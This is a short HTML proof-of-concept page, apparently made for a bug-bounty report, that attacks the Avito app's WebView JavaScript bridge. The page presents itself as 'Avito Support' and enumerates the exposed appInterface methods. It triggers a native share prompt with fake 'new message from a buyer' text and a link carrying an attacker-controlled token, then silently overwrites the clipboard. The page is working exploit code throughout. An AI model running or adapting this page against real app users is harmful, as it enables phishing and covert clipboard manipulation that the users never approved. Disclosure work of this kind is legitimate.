<!DOCTYPE html>
<html>
<head><title>Avito Support</title>
<style>
  body { font-family: monospace; padding: 20px; }
  .ok { color: green; font-weight: bold; }
  .err { color: red; font-weight: bold; }
</style>
</head>
<body>
<h2>PoC: appInterface exposure</h2>
<div id="out"></div>
<script>
window.onload = function() {
  var out = document.getElementById('out');
  var log = function(html) { out.innerHTML += '<p>' + html + '</p>'; };

  log('Origin: <b>' + location.origin + '</b>');
  log('Loaded inside Avito WebView');

  if (window.appInterface) {
    var methods = Object.getOwnPropertyNames(window.appInterface);
    log('<span class="ok">appInterface FOUND</span>');
    log('Methods: <b>' + JSON.stringify(methods) + '</b>');

    window.appInterface.share(
      'Avito — новое сообщение',
      'Вам пришло сообщение от покупателя',
      'https://voborgus.github.io/bb-poc-repo/?token=ATTACKER_CONTROLLED'
    );
    log('<span class="ok">appInterface.share() called → check share sheet</span>');

    window.appInterface.copy('SILENT_CLIPBOARD_WRITE_NO_PROMPT');
    log('appInterface.copy() called — clipboard overwritten silently');
  } else {
    log('<span class="err">appInterface NOT FOUND (not in Avito WebView)</span>');
  }
};
</script>
</body>
</html>
